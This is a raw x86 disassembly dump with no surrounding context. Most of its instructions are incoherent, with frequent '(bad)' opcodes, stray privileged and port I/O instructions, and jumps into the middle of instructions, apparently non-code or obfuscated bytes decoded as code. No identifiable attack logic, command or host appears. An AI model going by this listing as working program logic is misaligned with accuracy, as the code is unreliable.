  431d71:	xor    esi,DWORD PTR [ebp+0x3]
  431d74:	(bad)  
  431d75:	pmulhuw mm0,mm1
  431d78:	test   DWORD PTR [ebp-0x8],ecx
  431d7b:	mov    DWORD PTR [ebp-0x67],eax
  431d7e:	mov    eax,DWORD PTR [ebp-0x4]
  431d81:	xor    edi,DWORD PTR [ebp-0x73]
  431d84:	xor    eax,DWORD PTR [ebx]
  431d86:	xor    esi,DWORD PTR [edx+0x3]
  431d89:	add    BYTE PTR [ecx],bh
  431d8b:	inc    ebp
  431d8c:	(bad)  
  431d8d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d93:	mov    DWORD PTR [eax],0x750f0004
  431d99:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d9f:	lock add BYTE PTR [ebp+0x0],cl
  431da3:	mov    esi,DWORD PTR [ebp-0x18]
  431da6:	mov    ebp,edx
  431da8:	or     al,0x72
  431daa:	ja     0x431dac
  431dac:	mov    edx,esi
  431dae:	cld    
  431daf:	(bad)  
  431db2:	cli    
  431db3:	mov    esi,DWORD PTR [ebp-0x4]
  431db6:	cmp    ecx,esi
  431db8:	bswap  edi
  431dba:	(bad)
  431dbe:	mov    esi,DWORD PTR [ebp-0x4]
  431dc1:	mov    esi,ecx
  431dc3:	clc    
  431dc4:	repnz add esi,DWORD PTR [ebp+0x45]
  431dc8:	push   ebx
  431dc9:	xor    eax,DWORD PTR [ebp+0x3]
  431dcc:	cmp    bl,BYTE PTR [edi-0x64]
  431dcf:	pop    ebx
  431dd0:	jmp    0x431e97
  431dd5:	mov    esi,DWORD PTR [ebp-0x7d]
  431dd8:	xor    ebp,DWORD PTR [eax]
  431dda:	lea    eax,[ebp-0x8]
  431ddd:	xor    eax,0xc7ef9cf2
  431de2:	neg    eax
  431de4:	ins    DWORD PTR es:[edi],dx
  431de5:	test   esi,edi
  431de7:	clc    
  431de8:	pop    esp
  431de9:	inc    ebp
  431dea:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431df0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431df6:	add    cl,al
  431df8:	jne    0x431d94
  431dfa:	mov    esi,DWORD PTR [edx]
  431dfc:	in     al,dx
  431dfd:	push   esi
  431dfe:	xor    BYTE PTR [ebp-0xe],dh
  431e01:	add    edi,esi
  431e03:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431e09:	add    cl,bh
  431e0b:	mov    edi,DWORD PTR [ebp+0x8]
  431e0e:	mov    DWORD PTR [ebp-0x14],esi
  431e11:	add    esi,DWORD PTR [ebp+0x3c]
  431e14:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431e1a:	mov    ah,0x38
  431e1c:	call   0xe0e4:0x898b329c
  431e23:	jne    0x431e9a
  431e25:	mov    ecx,DWORD PTR [ebx-0xe0e13f4]
  431e2b:	shl    edx,0xf2
  431e2e:	(bad)  
  431e2f:	mov    ah,0x16
  431e31:	dec    eax
  431e32:	jne    0x431dc7
  431e34:	mov    ecx,DWORD PTR [edi]
  431e36:	in     al,dx
  431e37:	jmp    0x431e2a
  431e39:	add    dl,dh
  431e3b:	mov    edi,esi
  431e3d:	or     al,0x8
  431e3f:	inc    ebp
  431e40:	jne    0x431e45
  431e42:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e48:	ret    
  431e49:	or     bh,bh
  431e4b:	jge    0x431e35
  431e4d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e53:	xor    edi,eax
  431e55:	add    esi,DWORD PTR [ebp-0x77]
  431e58:	mov    ebx,esp
  431e5a:	clc    
  431e5b:	neg    DWORD PTR [ebp-0x7c]
  431e5e:	xor    eax,DWORD PTR [eax]
  431e60:	cmp    eax,DWORD PTR [eax]
  431e62:	repz jne 0x431dfa
  431e65:	xor    eax,DWORD PTR [ecx]
  431e67:	add    ebx,DWORD PTR [eax]
  431e69:	mov    DWORD PTR [ebp-0x8],eax
  431e6c:	mov    eax,edi
  431e6e:	cld    
  431e6f:	lock pop eax
  431e71:	test   DWORD PTR [ebx],esi
  431e73:	clc    
  431e74:	add    edx,DWORD PTR [edi-0x740bff77]
  431e7a:	fdivp  st(4),st
  431e7c:	test   ecx,esi
  431e7e:	(bad)  
  431e7f:	jnp    0x431e80
  431e81:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e87:	jae    0x431e14
  431e89:	sub    edi,esp
  431e8b:	(bad)  
  431e8c:	shl    DWORD PTR [eax-0x3e],0x89
  431e90:	leave  
  431e91:	call   0x8198d59e
  431e96:	in     al,dx
  431e97:	(bad)  
  431e98:	in     al,dx
  431e99:	add    bh,al
  431e9b:	mov    esp,edi
  431e9d:	in     al,dx
  431e9e:	test   DWORD PTR [ebp-0x8],edi
  431ea1:	mov    eax,DWORD PTR [ebp+0x2b]
  431ea4:	xor    al,0x3
  431ea6:	pushf  
  431ea7:	jnp    0x57321ae0
  431ead:	xor    edx,DWORD PTR [ebx-0x77]
  431eb0:	push   ecx
  431eb1:	loopne 0x431ee6
  431eb3:	jne    0x431e70
  431eb5:	mov    esi,DWORD PTR [edx-0x20]
  431eb8:	add    BYTE PTR [ebp-0x3d],bh
  431ebb:	xor    eax,DWORD PTR [ebp-0x73]
  431ebe:	mov    edi,DWORD PTR [esi]
  431ec0:	cld    
  431ec1:	jb     0x431e89
  431ec3:	add    bl,al
  431ec5:	jne    0x431f0c
  431ec7:	mov    edx,DWORD PTR [edi-0x10]
  431eca:	jge    0x431f49
  431ecc:	mov    esi,DWORD PTR [ebx]
  431ece:	lock add ecx,DWORD PTR [ebp+0x3b]
  431ed2:	xor    esi,DWORD PTR [ebp-0x77]
  431ed5:	mov    esi,eax
  431ed7:	lock inc ebp
  431ed9:	jge    0x431f10
  431edb:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431ee2:	dec    ebp
  431ee3:	mov    esi,DWORD PTR [ebx]
  431ee5:	loopne 0x431e70
  431ee7:	jge    0x431ee1
  431ee9:	add    DWORD PTR [ebp-0x7d],eax
  431eec:	cmc    
  431eed:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431ef4:	dec    ebp
  431ef5:	hlt    
  431ef6:	xor    ebx,DWORD PTR [ebp-0x77]
  431ef9:	mov    esi,esp
  431efb:	in     al,0x45
  431efd:	jge    0x431f38
  431eff:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431f06:	dec    ebp
  431f07:	dec    esp
  431f08:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431f0e:	inc    ebp
  431f0f:	hlt    
  431f10:	xor    eax,0xb88b9f75
  431f15:	add    al,0x95
  431f17:	icebp  
  431f18:	add    dl,dh
  431f1a:	mov    DWORD PTR [ebp+0x20],ebx
  431f1d:	cmp    eax,DWORD PTR [ebp+0xf]
  431f20:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431f24:	fistp  WORD PTR [ebx+0x0]
  431f27:	inc    ebp
  431f28:	mov    ebx,DWORD PTR [edi+0xc]
  431f2b:	add    eax,eax
  431f2d:	inc    ebp
  431f2e:	test   BYTE PTR [ebx],dh
  431f30:	add    eax,DWORD PTR [ebx]
  431f32:	add    BYTE PTR [esi+0x45],bl
  431f35:	ret    0x85
  431f38:	jnp    0x5443a307
  431f3e:	inc    bp
  431f40:	inc    ebp
  431f41:	xor    eax,0xc78a9cb9
  431f46:	add    ah,bl
  431f48:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  431f4e:	add    BYTE PTR [ebx+0x3],dl
  431f51:	mov    esi,0x708088b
  431f56:	cmp    esi,eax
  431f58:	setp   BYTE PTR [ecx-0x74fcffce]
  431f5f:	mov    esp,edi
  431f61:	call   0x33ce64b3
  431f66:	or     BYTE PTR [ebx],al
  431f68:	inc    ecx
  431f69:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f6f:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f75:	lock add cl,al
  431f78:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f7f:	mov    ch,0x45
  431f81:	clc    
  431f82:	xor    eax,DWORD PTR [ebp+0x3]
  431f85:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f8b:	inc    ebp
  431f8c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f92:	mov    edi,eax
  431f94:	mov    eax,DWORD PTR [ebp+0x3c]
  431f97:	mov    ecx,DWORD PTR [eax]
  431f99:	hlt    
  431f9a:	inc    ebp
  431f9b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431fa2:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431fa8:	push   ebp
  431fa9:	mov    edi,DWORD PTR [ebx]
  431fab:	in     al,dx
  431fac:	jne    0x431f6f
  431fae:	mov    eax,DWORD PTR [ebp-0x28]
  431fb1:	add    DWORD PTR [eax],0xe8058dec
  431fb7:	clc    
  431fb8:	mov    esi,DWORD PTR [edi-0x8]
  431fbb:	add    dh,dl
  431fbd:	rol    WORD PTR [ebp-0x1],cl
  431fc1:	mov    edx,DWORD PTR [eax+0x8]
  431fc4:	jne    0x431f86
  431fc6:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431fcd:	inc    ebp
  431fce:	push   esp
  431fcf:	test   DWORD PTR [ecx+0xf],ecx
  431fd2:	sub    edx,esp
  431fd4:	add    eax,DWORD PTR [eax]
  431fd6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431fdc:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431fe3:	mov    eax,DWORD PTR [ecx]
  431fe5:	and    BYTE PTR [eax],al
  431fe7:	cmp    dl,BYTE PTR [eax]
  431fe9:	add    BYTE PTR [ebp+0x66],al
  431fec:	inc    ecx
  431fee:	push   esp
  431fef:	add    BYTE PTR [ebp+0x0],dh
  431ff2:	push   edx
  431ff3:	enterw 0xc1,0x4d
  431ff8:	mov    esp,DWORD PTR [esi+0x20]
  431ffb:	add    DWORD PTR [ecx-0x7b],eax
  431ffe:	add    eax,DWORD PTR [ebx]
  432000:	str    WORD PTR [eax+0x45]
  432004:	lea    ecx,[ebx+0x45890801]
  43200a:	sbb    BYTE PTR [ebx],al
  43200c:	dec    ebp
  43200d:	cmp    al,0xf
  43200f:	inc    ebp
  432010:	push   eax
  432011:	mov    esi,DWORD PTR [ebx]
  432013:	push   eax
  432014:	add    eax,eax
  432016:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  43201d:	inc    ebp
  43201e:	add    BYTE PTR ds:0x8b4d8c00,dh
  432024:	xor    edx,esp
  432026:	add    eax,esi
  432028:	mov    ebx,eax
  43202a:	loopne 0x432071
  43202c:	dec    ebp
  43202d:	mov    ecx,DWORD PTR [edi]
  43202f:	cld    
  432030:	push   eax
  432031:	xchg   DWORD PTR [ebx],esi
  432033:	add    DWORD PTR [ebx],ebp
  432035:	add    BYTE PTR [ebx],ch
  432037:	or     BYTE PTR [ecx],bh
  432039:	dec    ecx
  43203a:	loopne 0x43203f
  43203c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432042:	push   ebp
  432043:	add    DWORD PTR [ebx+0x55100800],eax
  432049:	dec    ebp
  43204a:	jmp    0x431fd5
  43204c:	mov    esp,DWORD PTR [eax]
  43204e:	sbb    dl,dl
  432050:	inc    eax
  432051:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432057:	add    BYTE PTR [ebx+0x74528555],cl
  43205d:	push   ebp
  43205e:	div    DWORD PTR [ebx]
  432060:	and    eax,DWORD PTR [ebx]
  432062:	add    edx,DWORD PTR [edx-0x30]
  432065:	jno    0x431ff2
  432067:	inc    DWORD PTR [eax+eiz*1]
  43206a:	inc    ebp
  43206b:	push   eax
  43206c:	push   eax
  43206d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432073:	mov    edi,esp
  432075:	push   eax
  432076:	inc    ebp
  432077:	enter  0x458b,0x8
  43207b:	push   ecx
  43207c:	(bad)  
  43207d:	call   0x10d2a55
  432082:	pop    ss
  432083:	push   ebp
  432084:	mov    ecx,DWORD PTR [ebx+0x489408]
  43208a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432090:	push   ecx
  432091:	jo     0x43207b
  432093:	inc    DWORD PTR [edi]
  432095:	or     BYTE PTR [eax],al
  432097:	call   0xce27e1
  43209c:	fmul   QWORD PTR [ebp+0x55]
  43209f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4320a5:	mov    bh,0x8c
  4320a7:	adc    al,0x9a
  4320a9:	dec    esp
  4320aa:	xor    bl,BYTE PTR [eax]
  4320ac:	mov    ecx,DWORD PTR [ebp+0xc]
  4320af:	mov    eax,DWORD PTR [ebp-0x4]
  4320b2:	mov    esi,DWORD PTR [edi-0x3148f924]
  4320b8:	push   es
  4320b9:	retf   
  4320ba:	mov    BYTE PTR [ebp-0x30],0x3b
  4320be:	inc    ebp
  4320bf:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4320c6:	retf   0x83fc
  4320c9:	into   
  4320ca:	dec    ebp
  4320cb:	retf   
  4320cc:	mov    ecx,DWORD PTR [ebp-0x74]
  4320cf:	mov    eax,DWORD PTR [eax]
  4320d1:	fdiv   QWORD PTR [ebx]
  4320d3:	mov    bh,0x3
  4320d5:	push   es
  4320d6:	mov    esi,ecx
  4320d8:	sbb    cl,dl
  4320da:	dec    ebp
  4320db:	sar    DWORD PTR [ebx],cl
  4320dd:	push   ebp
  4320de:	jne    0x4320ef
  4320e0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320e6:	lea    ebx,[eax]
  4320e8:	call   0xf4ccacaf
  4320ed:	sbb    dh,dl
  4320ef:	add    edx,ebx
  4320f1:	push   ebp
  4320f2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320f8:	push   ecx
  4320f9:	mov    DWORD PTR [eax-0x30],edx
  4320fc:	test   DWORD PTR [edx],eax
  4320fe:	xadd   esp,esi
  432101:	pop    es
  432102:	add    cl,dl
  432104:	mov    eax,ecx
  432106:	or     al,0x45
  432108:	(bad)  
  432109:	push   eax
  43210a:	add    DWORD PTR [edx+0x0],eax
  43210d:	add    ecx,DWORD PTR [ecx]
  43210f:	and    dh,cl
  432111:	call   0xc729e1
  432116:	add    DWORD PTR [ebp+0x0],edx
  432119:	mov    esp,DWORD PTR [ebp+0x18]
  43211c:	add    BYTE PTR [eax+0x54],cl
  43211f:	xor    eax,DWORD PTR [eax]
  432121:	add    esp,DWORD PTR [esi+0x3b]
  432124:	inc    ebp
  432125:	je     0x4320aa
  432127:	push   ecx
  432128:	cli    
  432129:	dec    ebp
  43212a:	mov    DWORD PTR [ebx],eax
  43212c:	(bad)  
  43212d:	or     al,0x5e
  43212f:	inc    eax
  432130:	add    BYTE PTR [ebx],al
  432132:	data16 and BYTE PTR [ebp+0x50],al
  432136:	sub    DWORD PTR [ecx],0xfffffff8
  432139:	add    BYTE PTR [ebp-0x75],ah
  43213c:	add    BYTE PTR [eax],bl
  43213e:	enter  0x894d,0x8b
  432142:	int3   
  432143:	loopne 0x43217f
  432145:	rol    BYTE PTR [eax],0x33
  432148:	lea    cx,[ebp+0xa]
  43214c:	data16 jb 0x432194
  43214f:	add    BYTE PTR [ebx+0x44890855],cl
  432155:	sbb    ah,al
  432157:	inc    ebp
  432158:	cmp    cl,BYTE PTR [edi]
  43215a:	add    BYTE PTR [edx+0x66],dl
  43215d:	xor    ecx,DWORD PTR [eax]
  43215f:	sub    eax,DWORD PTR [eax]
  432161:	mov    eax,DWORD PTR [eax]
  432163:	or     al,0x66
  432165:	ror    edx,cl
  432167:	dec    ebp
  432168:	inc    ebp
  432169:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43216f:	cld    
  432170:	or     BYTE PTR [edi+0x4501dd],dl
  432176:	ror    dh,0xee
  432179:	retf   
  43217a:	(bad)  
  43217b:	dec    ebp
  43217c:	mov    al,0x8b
  43217e:	loop   0x4321a0
  432180:	cmp    ecx,DWORD PTR [edx]
  432182:	inc    ebp
  432183:	daa    
  432184:	loop   0x43210d
  432186:	out    dx,al
  432187:	add    edi,eax
  432189:	add    BYTE PTR [eax+0x3f52ed55],bh
  43218f:	push   ebp
  432190:	inc    ebp
  432191:	xor    ebx,eax
  432193:	add    ebp,esi
  432195:	push   edx
  432196:	push   bp
  432198:	inc    ebp
  432199:	(bad)  
  43219a:	jmp    0xc342e7f3
  43219f:	sbb    al,0x33
  4321a1:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4321a8:	add    BYTE PTR [ebp+0x45],0x8b
  4321ac:	jmp    0xf98b:0x100041c8
  4321b3:	xor    esi,DWORD PTR [edx+0x3]
  4321b6:	mov    ecx,DWORD PTR [edi]
  4321b8:	fmul   DWORD PTR [edx]
  4321ba:	add    BYTE PTR [eax],al
  4321bc:	lea    eax,[ebx-0x4700273c]
  4321c2:	add    al,0x4f
  4321c4:	pop    DWORD PTR [eax]
  4321c6:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4321cc:	push   edx
  4321cd:	inc    WORD PTR [ebp+0x8]
  4321d1:	mov    eax,0x514f4d
  4321d6:	(bad)
  4321da:	add    al,al
  4321dc:	xor    DWORD PTR [ebx-0x74baf730],eax
  4321e2:	test   DWORD PTR [esi+0x74],esp
  4321e5:	inc    ebp
  4321e6:	mov    DWORD PTR [eax+0xa4f08],edi
  4321ec:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321f2:	or     dh,cl
  4321f4:	or     eax,0x8b8d5045
  4321f9:	inc    ebp
  4321fa:	mov    WORD PTR [ecx+0x3b8a00],?
  432200:	jne    0x432235
  432202:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432208:	add    DWORD PTR [ebx],eax
  43220a:	add    bh,bh
  43220c:	adc    DWORD PTR [eax],ecx
  43220e:	adc    DWORD PTR [ebp+0x55],edi
  432211:	push   es
  432212:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432218:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11d8]
  43221f:	inc    ebp
  432220:	mov    esp,edi
  432222:	or     al,0xd8
  432224:	push   eax
  432225:	(bad)  
  432226:	jne    0x4321dc
  432228:	call   0x3b1b15
  43222d:	inc    ebp
  43222e:	sar    BYTE PTR [edx],0x84
  432231:	out    dx,al
  432232:	add    bh,al
  432234:	add    BYTE PTR [ebp+esi*2-0x247428],bh
  43223b:	(bad)  
  43223c:	and    al,al
  43223e:	fs jmp 0x7cc86843
  432244:	bswap  ecx
  432246:	scas   al,BYTE PTR es:[edi]
  432247:	inc    esp
  432248:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43224f:	or     BYTE PTR [ebx-0x97717c7],0x83
  432256:	call   DWORD PTR [edi]
  432258:	shr    ah,0x84
  43225b:	xchg   DWORD PTR [eax],eax
  43225d:	add    DWORD PTR [eax],eax
  43225f:	add    bh,bh
  432261:	dec    ebp
  432262:	and    BYTE PTR [ecx-0x38],dl
  432265:	push   eax
  432266:	dec    DWORD PTR [ebx+0xfd885]
  43226c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432272:	mov    WORD PTR [ecx+0x0],ss
  432275:	lea    ecx,[ebx+0x108b20d8]
  43227b:	mov    WORD PTR [edx],ds
  43227d:	add    BYTE PTR [edi+0xff01ff],al
  432283:	mov    ecx,DWORD PTR [ebp-0x28]
  432286:	push   ecx
  432287:	shl    BYTE PTR [ebp+0x3a],0x8b
  43228b:	inc    ebp
  43228c:	in     al,0xeb
  43228e:	jno    0x43221b
  432290:	push   edx
  432291:	mov    DWORD PTR [eax-0x28],edx
  432294:	mov    eax,DWORD PTR [ebp+0x20]
  432297:	je     0x432220
  432299:	mov    eax,DWORD PTR [ecx]
  43229b:	sbb    BYTE PTR [eax],al
  43229d:	pop    DWORD PTR [eax]
  43229f:	add    esi,eax
  4322a1:	add    bl,al
  4322a3:	adc    DWORD PTR [edi],esi
  4322a5:	jmp    0x8bce72f7
  4322aa:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4322b1:	jne    0x43223e
  4322b3:	mov    ecx,DWORD PTR [eax]
  4322b5:	in     al,0x75
  4322b7:	pop    DWORD PTR [ecx+0x5301]
  4322bd:	push   edx
  4322be:	inc    DWORD PTR [ebx]
  4322c0:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4322c6:	add    BYTE PTR [edi+0x9],dl
  4322c9:	call   DWORD PTR [esi]
  4322cb:	and    dl,al
  4322cd:	and    bh,bh
  4322cf:	inc    edi
  4322d1:	test   eax,edx
  4322d3:	sldt   ebx
  4322d6:	xor    al,0x0
  4322d8:	pushf  
  4322d9:	(bad)  
  4322da:	jmp    0x4322e8
  4322dc:	mov    eax,edi
  4322de:	or     al,0x75
  4322e0:	inc    eax
  4322e1:	call   0x4319e9
  4322e6:	mov    eax,eax
  4322e8:	loopne 0x43226e
  4322ea:	inc    ebp
  4322eb:	add    BYTE PTR [ebx+0x1451c00],cl
  4322f1:	mov    eax,DWORD PTR [ebp+0x20]
  4322f4:	add    edi,ecx
  4322f6:	add    BYTE PTR [eax],ch
  4322f8:	cmp    edi,0x18
  4322fb:	test   DWORD PTR [ebp+0xf],esi
  4322fe:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432305:	jne    0x432309
  432307:	call   0xffa21dcc
  43230c:	leave  
  43230d:	rcr    BYTE PTR [esp+eax*4],0x55
  432311:	add    ah,ch
  432313:	add    BYTE PTR [edi-0x48fef979],dh
  432319:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  432320:	inc    esp
  432321:	mov    ebx,DWORD PTR [eax]
  432323:	fcom   st(2)
  432325:	add    BYTE PTR [edi],bl
  432327:	lea    ecx,[eax-0x18]
  43232a:	(bad)  
  43232b:	push   DWORD PTR [ecx]
  43232d:	call   0xffb5708f
  432332:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432336:	fstp   DWORD PTR [esi+ebx*8]
  432339:	push   ebp
  43233a:	pop    ebp
  43233b:	mov    esi,DWORD PTR [edx-0x38]
  43233e:	add    DWORD PTR [eax],0x28
  432341:	mov    edi,DWORD PTR [ebx]
  432343:	xor    esi,DWORD PTR [edx+0x3]
  432346:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43234a:	pop    ebp
  43234b:	or     al,0x4
  43234d:	inc    ecx
  43234e:	push   ebp
  43234f:	(bad)  
  432350:	in     al,dx
  432351:	or     ah,ch
  432353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432354:	xbegin 0xffc8994a
  43235a:	clc    
  43235b:	adc    al,0x45
  43235d:	div    BYTE PTR [eax+ecx*1]
  432360:	pushf  
  432361:	add    bh,al
  432363:	jne    0x43233d
  432365:	add    DWORD PTR [ebp+0x5b00f89a],0x66710066
  43236f:	add    eax,DWORD PTR [ebp+0x52]
  432372:	adc    eax,0x20
  432375:	xchg   DWORD PTR [ecx+0x4000fc01],ecx
  43237b:	test   DWORD PTR [eax],eax
  43237d:	clc    
  43237e:	data16 or al,BYTE PTR [ebp+0x45]
  432382:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432389:	rol    BYTE PTR [ebp+0x45],1
  43238c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432392:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432398:	push   ebx
  432399:	add    BYTE PTR [ebx+0x0],dl
  43239c:	push   ecx
  43239d:	jge    0x4323d2
  43239f:	add    BYTE PTR [esi+0x4],dl
  4323a2:	jne    0x432409
  4323a4:	mov    edx,0x457200
  4323a9:	jmp    0x43236d
  4323ab:	xor    edi,DWORD PTR [ebx]
  4323ad:	pop    edi
  4323ae:	cvtdq2ps xmm7,xmm0
  4323b1:	ret    0x0
  4323b4:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4323ba:	xor    ecx,DWORD PTR [edi]
  4323bc:	add    eax,DWORD PTR [ecx+0x3b]
  4323bf:	push   ebx
  4323c0:	rdpmc  
  4323c2:	out    0x8d,al
  4323c4:	add    BYTE PTR [eax],cl
  4323c6:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4323cc:	ret    0x450c
  4323cf:	sbb    al,0x8b
  4323d1:	cmp    eax,esi
  4323d3:	or     cl,al
  4323d5:	or     al,0xc2
  4323d7:	pop    eax
  4323d8:	inc    ebp
  4323d9:	add    ecx,DWORD PTR [edi]
  4323db:	add    esi,DWORD PTR [ebp+0x39]
  4323de:	invd   
  4323e0:	jge    0x4323ec
  4323e2:	mov    eax,0x478ac0
  4323e7:	cli    
  4323e8:	xor    esp,ecx
  4323ea:	mov    ebx,0x5b8ac0
  4323ef:	ret    0x33
  4323f2:	mov    eax,0x833b8b
  4323f7:	sub    BYTE PTR [ebx],al
  4323f9:	inc    ebp
  4323fa:	xor    ax,0x9cf8
  4323fe:	inc    bh
  432400:	mov    esp,esp
  432402:	hlt    
  432403:	test   DWORD PTR [ebp-0x8],esi
  432406:	mov    eax,DWORD PTR [ebp-0x14]
  432409:	cmp    ecx,DWORD PTR [ebx-0x76478864]
  43240f:	dec    edi
  432410:	or     BYTE PTR [eax],al
  432412:	jne    0x43239d
  432414:	mov    esi,esp
  432416:	call   0x77a9afdb
  43241b:	inc    ebp
  43241c:	mov    DWORD PTR [eax+0x9a4f0c],edi
  432422:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432428:	add    BYTE PTR [esi+0x7d],ah
  43242b:	inc    ebp
  43242c:	mov    bx,WORD PTR [ebp+0x8]
  432430:	add    DWORD PTR [ebp+0x53],0x30c008b
  432437:	inc    ebp
  432438:	mov    bx,di
  43243b:	lock test BYTE PTR [ecx+0x7000801],bh
  432442:	jge    0x432405
  432444:	mov    ecx,DWORD PTR [ebx-0x650613f0]
  43244a:	cli    
  43244b:	xor    bl,bh
  43244d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432453:	test   BYTE PTR [eax],cl
  432455:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43245c:	cmp    ebp,eax
  43245e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432465:	test   BYTE PTR [ebp+0x1],bh
  432468:	mov    ebx,0x458a00
  43246d:	xor    esi,DWORD PTR [ebx]
  43246f:	add    esp,DWORD PTR [esi-0x77]
  432472:	pop    ebp
  432473:	loopne 0x4324db
  432475:	inc    ebp
  432476:	clc    
  432477:	xor    edi,DWORD PTR [ebx]
  432479:	add    esi,DWORD PTR [edx-0x77]
  43247c:	data16 fdivr QWORD PTR [ebp-0x49]
  432480:	mov    ebx,0xb78afc
  432485:	hlt    
  432486:	xor    edi,DWORD PTR [edx]
  432488:	data16 add BYTE PTR [ebp+0x66],bl
  43248c:	data16 lock clc 
  43248f:	cmp    bh,BYTE PTR [ebx]
  432491:	add    BYTE PTR [edi+0x66],dh
  432494:	psubq  mm7,QWORD PTR [ebp+0x0]
  432498:	ltr    WORD PTR [ebp+0x66]
  43249c:	add    esi,eax
  43249e:	add    di,WORD PTR [ebp+0x2b]
  4324a2:	data16 data16 jge 0x432523
  4324a6:	mov    ebx,0xe08a8b
  4324ab:	jge    0x4324e0
  4324ad:	data16 data16 xor al,0x5d
  4324b1:	data16 data16 jne 0x4324ad
  4324b5:	mov    edi,DWORD PTR [ebx]
  4324b7:	fdiv   QWORD PTR [edx+0x7d]
  4324ba:	data16 data16 jge 0x4324f2
  4324be:	mov    ebx,0x758a66
  4324c3:	mov    esi,0x667233
  4324c8:	pop    ebp
  4324c9:	or     BYTE PTR [esi+0x0],ah
  4324cc:	clc    
  4324cd:	mov    edi,DWORD PTR [ebx]
  4324cf:	lock ja 0x43245d
  4324d2:	(bad)  
  4324d4:	jge    0x4324cd
  4324d6:	invd   
  4324d8:	pop    ebp
  4324d9:	add    BYTE PTR [ebx],al
  4324db:	(bad)  
  4324dc:	cmp    di,WORD PTR [ebp+0xf]
  4324e0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324e4:	mov    bx,WORD PTR [ebp-0x10]
  4324e8:	pop    bp
  4324ea:	fbstp  TBYTE PTR [ebx]
  4324ec:	test   DWORD PTR [ebx],eax
  4324ee:	add    BYTE PTR [ebx],bh
  4324f0:	add    BYTE PTR [esi+0x7d],ah
  4324f3:	jge    0x432480
  4324f5:	data16 in al,dx
  4324f7:	pop    ebp
  4324f8:	stc    
  4324f9:	bsf    ecx,DWORD PTR [ebp+0x6632009a]
  432500:	mov    edi,ebx
  432502:	in     al,dx
  432503:	test   BYTE PTR [ebp+0x0],bh
  432506:	mov    eax,DWORD PTR [eax]
  432508:	call   0xbd401e98
  43250d:	cmp    bl,BYTE PTR [edx-0x7699ce00]
  432513:	sti    
  432514:	call   0x8b4ba2a4
  432519:	add    ebp,esp
  43251b:	mov    bx,di
  43251e:	jnp    0x432546
  432520:	mov    DWORD PTR [ebx+0x3a7df808],ecx
  432526:	mov    eax,DWORD PTR [eax]
  432528:	call   0x7c3eb093
  43252d:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432533:	data16 data16 fistp WORD PTR [ebp+0xe]
  432538:	xor    DWORD PTR [edi-0x48fff7ad],0xfb66f403
  432542:	fisttp WORD PTR [ecx-0x7401f77b]
  432548:	(bad)  
  432549:	cld    
  43254a:	jne    0x432586
  43254c:	xor    eax,DWORD PTR [eax]
  43254e:	mov    esp,DWORD PTR [esi-0x10]
  432551:	sti    
  432552:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432559:	data16 adc bl,bh
  43255c:	push   ebp
  43255d:	xor    ecx,DWORD PTR es:[ebx+0x3ae4f88b]
  432564:	mov    WORD PTR [eax],es
  432566:	call   0xe48b:0x89fb3266
  43256d:	or     al,0x55
  43256f:	add    ecx,DWORD PTR [ebx-0x7420139a]
  432575:	push   cs
